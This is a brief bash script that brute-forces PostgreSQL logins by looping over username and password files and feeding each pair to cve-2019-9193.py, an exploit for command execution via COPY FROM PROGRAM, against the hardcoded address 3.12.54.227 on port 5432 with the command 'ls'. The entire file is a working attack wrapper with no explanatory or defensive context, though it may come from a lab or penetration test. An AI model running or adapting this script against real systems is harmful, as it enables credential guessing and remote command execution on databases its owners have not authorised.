#! /bin/bash
ufile=$(cat unamefile.txt)
for uline in $ufile

do

file=$(cat pwfile.txt)
for line in $file
do
python3 cve-2019-9193.py -i 3.12.54.227 -p 5432 -U $uline -P $line -c 'ls'
done

done
